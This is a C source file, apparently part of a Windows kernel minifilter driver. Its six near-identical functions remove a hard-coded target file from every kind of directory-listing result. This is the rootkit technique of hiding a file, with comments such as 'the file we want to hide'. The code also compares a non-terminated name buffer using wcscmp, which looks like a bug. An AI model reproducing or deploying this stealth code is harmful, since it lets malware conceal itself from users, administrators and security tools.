#include <main.h>

NTSTATUS FilterFileNamesInformation(PFILE_NAMES_INFORMATION info, PFLT_FILE_NAME_INFORMATION FileInfo)
{
	PFILE_NAMES_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING QueriedFile;
	UINT32 offset, moveLength;
	BOOLEAN search;
	NTSTATUS status = STATUS_SUCCESS;
	WCHAR ToHide[20] = TARGET_FILE;
	offset = 0;
	search = TRUE;

	do
	{
		QueriedFile.Buffer = info->FileName;
		QueriedFile.Length = (USHORT)info->FileNameLength;
		QueriedFile.MaximumLength = (USHORT)info->FileNameLength;

		// Is it the file we want to hide
		if (!wcscmp(QueriedFile.Buffer, ToHide))
		{
			DbgPrint("[*] stripped from query: %wZ\\%wZ\n", &FileInfo->FinalComponent, &QueriedFile);
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_NAMES_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_NAMES_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_NAMES_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_NAMES_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}


			if (retn)
				return status;

			info = (PFILE_NAMES_INFORMATION)((PCHAR)info + offset);
			continue;
		
	}
		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_NAMES_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}


NTSTATUS FilterFileIdBothDirectoryInformation(PFILE_ID_BOTH_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION FileInfo)
{
	PFILE_ID_BOTH_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING QueriedFile;
	WCHAR ToHide[20] = TARGET_FILE;
	offset = 0;
	search = TRUE;

	do
	{
		QueriedFile.Buffer = info->FileName;
		QueriedFile.Length = (USHORT)info->FileNameLength;
		QueriedFile.MaximumLength = (USHORT)info->FileNameLength;

		// Is it the file we want to hide
		if (!wcscmp(QueriedFile.Buffer, ToHide))
		{
			DbgPrint("[*] stripped from query: %wZ\\%wZ\n", &FileInfo->FinalComponent, &QueriedFile);

			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_ID_BOTH_DIR_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_ID_BOTH_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}


			if (retn)
				return status;

			info = (PFILE_ID_BOTH_DIR_INFORMATION)((PCHAR)info + offset);
			continue;

		}
		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_ID_BOTH_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return status;
}


NTSTATUS FilterFileDirectoryInformation(PFILE_DIRECTORY_INFORMATION info, PFLT_FILE_NAME_INFORMATION FileInfo)
{
	PFILE_DIRECTORY_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING QueriedFile;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;
	WCHAR ToHide[20] = TARGET_FILE;
	offset = 0;
	search = TRUE;

	do
	{
		QueriedFile.Buffer = info->FileName;
		QueriedFile.Length = (USHORT)info->FileNameLength;
		QueriedFile.MaximumLength = (USHORT)info->FileNameLength;

		// Is it the file we want to hide
		if (!wcscmp(QueriedFile.Buffer, ToHide))
		{
			DbgPrint("[*] stripped from query: %wZ\\%wZ\n", &FileInfo->FinalComponent, &QueriedFile);
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_DIRECTORY_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_DIRECTORY_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_DIRECTORY_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}

			if (retn)
				return status;

			info = (PFILE_DIRECTORY_INFORMATION)((PCHAR)info + offset);
			continue;
		
	}
		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_DIRECTORY_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}




NTSTATUS FilterFileBothDirectoryInformation(PFILE_BOTH_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION FileInfo)
{
	PFILE_BOTH_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING QueriedFile;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;
	WCHAR ToHide[20] = TARGET_FILE;
	offset = 0;
	search = TRUE;

	do
	{
		QueriedFile.Buffer = info->FileName;
		QueriedFile.Length = (USHORT)info->FileNameLength;
		QueriedFile.MaximumLength = (USHORT)info->FileNameLength;

		// Is it the file we want to hide
		if (!wcscmp(QueriedFile.Buffer, ToHide))
		{
			DbgPrint("[*] stripped from query: %wZ\\%wZ\n", &FileInfo->FinalComponent, &QueriedFile);
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_BOTH_DIR_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}


			if (retn)
				return status;

			info = (PFILE_BOTH_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		
	}
		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_BOTH_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}



NTSTATUS FilterFileIdFullDirectoryInformation(PFILE_ID_FULL_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION FileInfo)
{
	PFILE_ID_FULL_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING QueriedFile;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;
	WCHAR ToHide[20] = TARGET_FILE;
	offset = 0;
	search = TRUE;

	do
	{
		QueriedFile.Buffer = info->FileName;
		QueriedFile.Length = (USHORT)info->FileNameLength;
		QueriedFile.MaximumLength = (USHORT)info->FileNameLength;
		if (!wcscmp(QueriedFile.Buffer, ToHide))
		{
			DbgPrint("[*] stripped from query: %wZ\\%wZ\n", &FileInfo->FinalComponent, &QueriedFile);

				BOOLEAN retn = FALSE;

				if (prevInfo != NULL)
				{
					if (info->NextEntryOffset != 0)
					{
						prevInfo->NextEntryOffset += info->NextEntryOffset;
						offset = info->NextEntryOffset;
					}
					else
					{
						prevInfo->NextEntryOffset = 0;
						status = STATUS_SUCCESS;
						retn = TRUE;
					}

					RtlFillMemory(info, sizeof(FILE_ID_FULL_DIR_INFORMATION), 0);
				}
				else
				{
					if (info->NextEntryOffset != 0)
					{
						nextInfo = (PFILE_ID_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
						moveLength = 0;
						while (nextInfo->NextEntryOffset != 0)
						{
							moveLength += nextInfo->NextEntryOffset;
							nextInfo = (PFILE_ID_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
						}

						moveLength += FIELD_OFFSET(FILE_ID_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
						RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);
					}
					else
					{
						status = STATUS_NO_MORE_ENTRIES;
						retn = TRUE;
					}
				}


				if (retn)
					return status;

				info = (PFILE_ID_FULL_DIR_INFORMATION)((PCHAR)info + offset);
				continue;
			
		}
		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_ID_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}



NTSTATUS FilterFileFullDirectoryInformation(PFILE_FULL_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION FileInfo)
{
	PFILE_FULL_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING QueriedFile;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;
	WCHAR ToHide[20] = TARGET_FILE;
	offset = 0;
	search = TRUE;

	do
	{
		QueriedFile.Buffer = info->FileName;
		QueriedFile.Length = (USHORT)info->FileNameLength;
		QueriedFile.MaximumLength = (USHORT)info->FileNameLength;
		if (!wcscmp(QueriedFile.Buffer, ToHide))
		{
			DbgPrint("[*] stripped from query: %wZ\\%wZ\n", &FileInfo->FinalComponent, &QueriedFile);
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_FULL_DIR_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}

			if (retn)
				return status;

			info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		
	}
		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}